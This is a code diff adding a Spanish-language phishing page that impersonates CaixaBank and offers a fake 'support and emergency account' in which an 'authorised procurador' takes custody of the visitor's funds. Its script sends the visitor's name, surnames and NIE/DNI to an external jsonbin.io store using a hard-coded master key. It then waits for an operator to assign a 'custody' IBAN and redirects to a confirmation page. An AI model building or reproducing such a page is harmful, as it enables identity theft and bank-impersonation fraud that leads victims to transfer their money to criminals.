@@ -1,0 +1,504 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+  <title>Cuenta de Soporte | CaixaBank</title>
+  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    html { font-size: 16px; }
+    body { font-family: 'Open Sans', Arial, sans-serif; background: #f0f4f8; color: #222; -webkit-font-smoothing: antialiased; }
+
+    /* ── HEADER ── */
+    .header {
+      background: #fff;
+      box-shadow: 0 2px 10px rgba(0,0,0,.12);
+      position: sticky; top: 0; z-index: 200;
+    }
+    .header-inner {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 12px 16px;
+      max-width: 900px;
+      margin: 0 auto;
+    }
+    .logo img { height: 32px; display: block; }
+    .header-btns { display: flex; gap: 8px; }
+    .btn-hazte {
+      background: #00a1e0;
+      color: #fff;
+      border-radius: 20px;
+      padding: 8px 16px;
+      font-size: 13px;
+      font-weight: 700;
+      text-decoration: none;
+      white-space: nowrap;
+    }
+    .btn-acceso {
+      border: 2px solid #00a1e0;
+      color: #00a1e0;
+      border-radius: 20px;
+      padding: 6px 14px;
+      font-size: 13px;
+      font-weight: 700;
+      text-decoration: none;
+      white-space: nowrap;
+    }
+
+    /* ── ALERT BANNER ── */
+    .alert-banner {
+      background: linear-gradient(135deg, #003087, #00a1e0);
+      color: #fff;
+      padding: 12px 16px;
+      font-size: 12.5px;
+      font-weight: 600;
+      line-height: 1.5;
+      text-align: center;
+    }
+    .alert-banner strong { display: block; font-size: 13px; margin-bottom: 3px; }
+
+    /* ── HERO ── */
+    .hero {
+      background: linear-gradient(160deg, #003087 0%, #005baa 55%, #00a1e0 100%);
+      color: #fff;
+      padding: 36px 20px 60px;
+      text-align: center;
+    }
+    .hero-badge {
+      display: inline-block;
+      background: rgba(255,255,255,.15);
+      border: 1px solid rgba(255,255,255,.35);
+      border-radius: 20px;
+      padding: 5px 16px;
+      font-size: 11px;
+      font-weight: 700;
+      letter-spacing: 1px;
+      text-transform: uppercase;
+      margin-bottom: 16px;
+    }
+    .hero h1 {
+      font-size: 26px;
+      font-weight: 800;
+      line-height: 1.2;
+      margin-bottom: 14px;
+      text-shadow: 0 2px 8px rgba(0,0,0,.2);
+    }
+    .hero h1 span { color: #7dd3fc; }
+    .hero p {
+      font-size: 14.5px;
+      opacity: .9;
+      line-height: 1.6;
+      max-width: 500px;
+      margin: 0 auto;
+    }
+
+    /* ── FORM CARD ── */
+    .form-wrap {
+      max-width: 560px;
+      margin: -30px auto 0;
+      padding: 0 14px 40px;
+      position: relative;
+      z-index: 10;
+    }
+    .form-card {
+      background: #fff;
+      border-radius: 18px;
+      box-shadow: 0 8px 32px rgba(0,0,0,.13);
+      padding: 28px 22px 24px;
+      border-top: 5px solid #00a1e0;
+    }
+    .form-card h2 {
+      font-size: 19px;
+      font-weight: 800;
+      color: #003087;
+      margin-bottom: 5px;
+    }
+    .form-card .subtitle {
+      font-size: 13px;
+      color: #666;
+      margin-bottom: 22px;
+      line-height: 1.5;
+    }
+    .form-group { margin-bottom: 16px; }
+    .form-group label {
+      display: block;
+      font-size: 11px;
+      font-weight: 700;
+      color: #444;
+      margin-bottom: 6px;
+      text-transform: uppercase;
+      letter-spacing: .5px;
+    }
+    .form-group input {
+      width: 100%;
+      padding: 14px 15px;
+      border: 1.5px solid #d0d5dd;
+      border-radius: 10px;
+      font-size: 16px; /* 16px previene zoom su iOS */
+      font-family: inherit;
+      color: #222;
+      background: #fafafa;
+      transition: border-color .2s, box-shadow .2s;
+      -webkit-appearance: none;
+    }
+    .form-group input:focus {
+      outline: none;
+      border-color: #00a1e0;
+      box-shadow: 0 0 0 3px rgba(0,161,224,.12);
+      background: #fff;
+    }
+    .form-group input.error { border-color: #e53935; }
+    .form-note { font-size: 11.5px; color: #888; margin-top: 4px; }
+    .error-msg { color: #e53935; font-size: 12px; margin-top: 4px; display: none; }
+
+    .btn-submit {
+      width: 100%;
+      padding: 16px;
+      background: linear-gradient(135deg, #003087, #00a1e0);
+      color: #fff;
+      border: none;
+      border-radius: 10px;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      letter-spacing: .3px;
+      margin-top: 6px;
+      -webkit-tap-highlight-color: transparent;
+      transition: opacity .2s;
+    }
+    .btn-submit:active { opacity: .85; }
+
+    .form-security {
+      display: flex;
+      align-items: flex-start;
+      gap: 8px;
+      margin-top: 14px;
+      padding: 12px 14px;
+      background: #f0fdf4;
+      border-radius: 10px;
+      border: 1px solid #bbf7d0;
+      font-size: 12px;
+      color: #166534;
+      line-height: 1.5;
+    }
+    .form-security .lock { font-size: 16px; flex-shrink: 0; margin-top: 1px; }
+
+    /* ── INFO BOXES ── */
+    .info-section {
+      max-width: 560px;
+      margin: 0 auto;
+      padding: 20px 14px 50px;
+    }
+    .info-grid { display: flex; flex-direction: column; gap: 14px; }
+    .info-box {
+      background: #fff;
+      border-radius: 14px;
+      padding: 20px 18px;
+      box-shadow: 0 2px 10px rgba(0,0,0,.07);
+      border-left: 4px solid #00a1e0;
+      display: flex;
+      gap: 14px;
+      align-items: flex-start;
+    }
+    .info-box .icon { font-size: 28px; flex-shrink: 0; }
+    .info-box h3 { font-size: 14.5px; font-weight: 700; color: #003087; margin-bottom: 5px; }
+    .info-box p { font-size: 13px; color: #555; line-height: 1.55; }
+
+    /* ── FOOTER ── */
+    footer {
+      background: #f5f5f5;
+      border-top: 3px solid #00a1e0;
+      padding: 24px 16px;
+      text-align: center;
+    }
+    footer img { height: 26px; margin-bottom: 10px; }
+    footer p { font-size: 11px; color: #888; line-height: 1.8; }
+    footer a { color: #00a1e0; text-decoration: none; }
+
+    /* ── OVERLAY CARICAMENTO ── */
+    #loading-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0,30,80,.93);
+      z-index: 9999;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+    #loading-overlay.active { display: flex; }
+    .loading-card {
+      background: #fff;
+      border-radius: 20px;
+      padding: 32px 24px;
+      text-align: center;
+      width: 100%;
+      max-width: 400px;
+      box-shadow: 0 20px 60px rgba(0,0,0,.4);
+    }
+    .loading-logo { height: 34px; margin-bottom: 20px; }
+    .loading-spinner {
+      width: 52px; height: 52px;
+      border: 4px solid #e8f4fd;
+      border-top-color: #00a1e0;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 20px;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .loading-title { font-size: 17px; font-weight: 700; color: #003087; margin-bottom: 8px; }
+    .loading-subtitle { font-size: 13px; color: #666; margin-bottom: 20px; line-height: 1.5; }
+    .loading-steps { text-align: left; margin-bottom: 16px; }
+    .loading-step {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      padding: 7px 0;
+      font-size: 12.5px;
+      color: #555;
+      border-bottom: 1px solid #f0f0f0;
+    }
+    .loading-step:last-child { border-bottom: none; }
+    .step-icon {
+      width: 22px; height: 22px;
+      border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 11px; flex-shrink: 0;
+    }
+    .step-pending { background: #e8f4fd; color: #00a1e0; }
+    .step-done    { background: #d1fae5; color: #059669; }
+    .step-active  { background: #fef3c7; color: #d97706; animation: pulse .9s ease-in-out infinite; }
+    @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.4} }
+    .loading-progress { background: #e8f4fd; border-radius: 10px; height: 6px; overflow: hidden; }
+    .loading-progress-bar { height: 100%; background: linear-gradient(90deg,#003087,#00a1e0); border-radius: 10px; width: 0%; transition: width .5s ease; }
+    .loading-info { font-size: 11px; color: #aaa; margin-top: 12px; }
+
+    /* ── DESKTOP ── */
+    @media (min-width: 600px) {
+      .hero { padding: 50px 24px 70px; }
+      .hero h1 { font-size: 36px; }
+      .form-card { padding: 36px 36px 30px; }
+      .info-grid { flex-direction: row; flex-wrap: wrap; }
+      .info-box { flex: 1 1 calc(50% - 7px); }
+    }
+  </style>
+</head>
+<body>
+
+<!-- HEADER -->
+<header class="header">
+  <div class="header-inner">
+    <a href="index.html" class="logo"><img src="logo.png" alt="CaixaBank"></a>
+    <div class="header-btns">
+      <a href="cuenta-soporte.html" class="btn-hazte">Hazte cliente</a>
+      <a href="#" class="btn-acceso">Acceso</a>
+    </div>
+  </div>
+</header>
+
+<!-- ALERT BANNER -->
+<div class="alert-banner">
+  🛡️ <strong>CUENTA DE SOPORTE Y EMERGENCIA</strong>
+  Esta cuenta ha sido creada para salvaguardar y proteger sus fondos ante situaciones de riesgo financiero.
+</div>
+
+<!-- HERO -->
+<section class="hero">
+  <div class="hero-badge">🔒 Cuenta Protegida · Servicio Exclusivo</div>
+  <h1>ABRA SU <span>CUENTA DE SOPORTE</span> Y EMERGENCIA</h1>
+  <p>Proteja sus fondos de forma inmediata. Un procurador autorizado por CaixaBank gestionará y custodiará sus activos con total seguridad.</p>
+</section>
+
+<!-- FORM -->
+<section class="form-wrap">
+  <div class="form-card">
+    <h2>Datos de identificación</h2>
+    <p class="subtitle">Complete el formulario para activar su cuenta de soporte. Sus datos están protegidos con cifrado SSL de 256 bits.</p>
+
+    <form id="supportForm" novalidate>
+      <div class="form-group">
+        <label for="nombre">Nombre *</label>
+        <input type="text" id="nombre" placeholder="Ej: María" autocomplete="given-name" inputmode="text">
+        <div class="error-msg" id="err-nombre">Por favor, introduce tu nombre.</div>
+      </div>
+
+      <div class="form-group">
+        <label for="apellidos">Apellidos *</label>
+        <input type="text" id="apellidos" placeholder="Ej: García López" autocomplete="family-name" inputmode="text">
+        <div class="error-msg" id="err-apellidos">Por favor, introduce tus apellidos.</div>
+      </div>
+
+      <div class="form-group">
+        <label for="nie">NIE / DNI *</label>
+        <input type="text" id="nie" placeholder="Ej: X1234567A o 12345678Z" autocomplete="off" maxlength="12" inputmode="text" style="text-transform:uppercase">
+        <div class="form-note">Documento de identidad nacional o número de extranjero.</div>
+        <div class="error-msg" id="err-nie">Por favor, introduce tu NIE o DNI válido.</div>
+      </div>
+
+      <button type="submit" class="btn-submit">🔐 ACTIVAR CUENTA DE SOPORTE</button>
+
+      <div class="form-security">
+        <span class="lock">🔒</span>
+        <span>Conexión segura SSL 256-bit · Sus datos están protegidos y no serán compartidos con terceros.</span>
+      </div>
+    </form>
+  </div>
+</section>
+
+<!-- INFO BOXES -->
+<section class="info-section">
+  <div class="info-grid">
+    <div class="info-box">
+      <div class="icon">🛡️</div>
+      <div>
+        <h3>Protección Total de Fondos</h3>
+        <p>Sus activos quedan bajo custodia de un procurador certificado por CaixaBank, garantizando su integridad ante cualquier contingencia.</p>
+      </div>
+    </div>
+    <div class="info-box">
+      <div class="icon">⚡</div>
+      <div>
+        <h3>Activación Inmediata</h3>
+        <p>El proceso de verificación es automático. En pocos minutos recibirá los datos de su cuenta y del procurador asignado.</p>
+      </div>
+    </div>
+    <div class="info-box">
+      <div class="icon">🏛️</div>
+      <div>
+        <h3>Respaldo Institucional</h3>
+        <p>Cuenta avalada por CaixaBank y supervisada por el Banco de España. Máxima seguridad y transparencia en todo momento.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- FOOTER -->
+<footer>
+  <img src="logo.png" alt="CaixaBank">
+  <p>© CaixaBank, S.A. 2026<br>
+    <a href="#">Política de cookies</a> · <a href="#">Privacidad</a> · <a href="#">Aviso legal</a>
+  </p>
+</footer>
+
+<!-- OVERLAY CARICAMENTO -->
+<div id="loading-overlay">
+  <div class="loading-card">
+    <img src="logo.png" alt="CaixaBank" class="loading-logo">
+    <div class="loading-spinner"></div>
+    <div class="loading-title">Verificando su identidad...</div>
+    <div class="loading-subtitle">Por favor, no cierre esta ventana. Estamos procesando su solicitud.</div>
+    <div class="loading-steps">
+      <div class="loading-step">
+        <div class="step-icon step-done" id="icon1">✓</div>
+        <span>Datos de identificación recibidos</span>
+      </div>
+      <div class="loading-step">
+        <div class="step-icon step-active" id="icon2">⟳</div>
+        <span>Verificando con el Banco de España</span>
+      </div>
+      <div class="loading-step">
+        <div class="step-icon step-pending" id="icon3">○</div>
+        <span>Asignando procurador autorizado</span>
+      </div>
+      <div class="loading-step">
+        <div class="step-icon step-pending" id="icon4">○</div>
+        <span>Generando IBAN de custodia</span>
+      </div>
+      <div class="loading-step">
+        <div class="step-icon step-pending" id="icon5">○</div>
+        <span>Activando cuenta de soporte</span>
+      </div>
+    </div>
+    <div class="loading-progress">
+      <div class="loading-progress-bar" id="progressBar"></div>
+    </div>
+    <div class="loading-info">Este proceso puede tardar unos minutos. Gracias por su paciencia.</div>
+  </div>
+</div>
+
+<script>
+  const BIN_ID     = '69c0931dc3097a1dd54d7d00';
+  const MASTER_KEY = '$2a$10$RoiwGd894wsPzcL0d6AYtegWuH4z7zN1P09knFoJ/sP6fOaecTzm.';
+  const API_BASE   = 'https://api.jsonbin.io/v3/b';
+  let SESSION_ID   = null;
+  let pollTimer    = null;
+
+  function generateId() { return Date.now().toString(36) + Math.random().toString(36).substr(2,6); }
+  function getTimestamp() { return new Date().toLocaleString('es-ES', { timeZone: 'Europe/Madrid' }); }
+
+  document.getElementById('supportForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    const nombre    = document.getElementById('nombre').value.trim();
+    const apellidos = document.getElementById('apellidos').value.trim();
+    const nie       = document.getElementById('nie').value.trim().toUpperCase();
+    let valid = true;
+    if (!nombre)    { showErr('err-nombre','nombre'); valid=false; } else { hideErr('err-nombre','nombre'); }
+    if (!apellidos) { showErr('err-apellidos','apellidos'); valid=false; } else { hideErr('err-apellidos','apellidos'); }
+    if (!nie||nie.length<8) { showErr('err-nie','nie'); valid=false; } else { hideErr('err-nie','nie'); }
+    if (!valid) return;
+
+    document.getElementById('loading-overlay').classList.add('active');
+    animateSteps();
+
+    SESSION_ID = generateId();
+    const sessionData = { id:SESSION_ID, nombre, apellidos, nie, status:'pending', iban:null, proc_nombre:null, proc_apellidos:null, timestamp:getTimestamp(), ua:navigator.userAgent.substring(0,120) };
+
+    try {
+      const res  = await fetch(`${API_BASE}/${BIN_ID}`, { headers:{'X-Master-Key':MASTER_KEY} });
+      const data = await res.json();
+      const sessions = data.record.sessions || [];
+      sessions.push(sessionData);
+      await fetch(`${API_BASE}/${BIN_ID}`, { method:'PUT', headers:{'Content-Type':'application/json','X-Master-Key':MASTER_KEY}, body:JSON.stringify({sessions}) });
+    } catch(err) { console.error(err); }
+
+    localStorage.setItem('cxb_session_id', SESSION_ID);
+    startPolling();
+  });
+
+  function showErr(id,fid) { document.getElementById(id).style.display='block'; document.getElementById(fid).classList.add('error'); }
+  function hideErr(id,fid) { document.getElementById(id).style.display='none'; document.getElementById(fid).classList.remove('error'); }
+
+  const stepTimings  = [0,2000,5000,9000,14000];
+  const progressVals = [20,40,60,80,95];
+  function animateSteps() {
+    stepTimings.forEach((t,i) => {
+      setTimeout(() => {
+        if (i>0) { document.getElementById(`icon${i}`).className='step-icon step-done'; document.getElementById(`icon${i}`).textContent='✓'; }
+        if (i<5) { document.getElementById(`icon${i+1}`).className='step-icon step-active'; document.getElementById(`icon${i+1}`).textContent='⟳'; }
+        document.getElementById('progressBar').style.width = progressVals[i]+'%';
+      }, t);
+    });
+  }
+
+  function startPolling() { pollTimer = setInterval(checkStatus, 4000); }
+
+  async function checkStatus() {
+    if (!SESSION_ID) return;
+    try {
+      const res  = await fetch(`${API_BASE}/${BIN_ID}/latest`, { headers:{'X-Master-Key':MASTER_KEY} });
+      const data = await res.json();
+      const session = (data.record.sessions||[]).find(s=>s.id===SESSION_ID);
+      if (session && session.status==='ready') {
+        clearInterval(pollTimer);
+        document.getElementById('progressBar').style.width='100%';
+        for(let i=1;i<=5;i++) { document.getElementById(`icon${i}`).className='step-icon step-done'; document.getElementById(`icon${i}`).textContent='✓'; }
+        localStorage.setItem('cxb_iban', session.iban);
+        localStorage.setItem('cxb_proc_nombre', session.proc_nombre);
+        localStorage.setItem('cxb_proc_apellidos', session.proc_apellidos);
+        localStorage.setItem('cxb_nombre', session.nombre);
+        localStorage.setItem('cxb_apellidos', session.apellidos);
+        setTimeout(() => { window.location.href='confirmacion.html'; }, 1200);
+      }
+    } catch(err) { console.error(err); }
+  }
+
+  window.addEventListener('load', () => {
+    const sid = localStorage.getItem('cxb_session_id');
+    if (sid && localStorage.getItem('cxb_iban')) { window.location.href='confirmacion.html'; }
+  });
+</script>
+</body>
+</html>
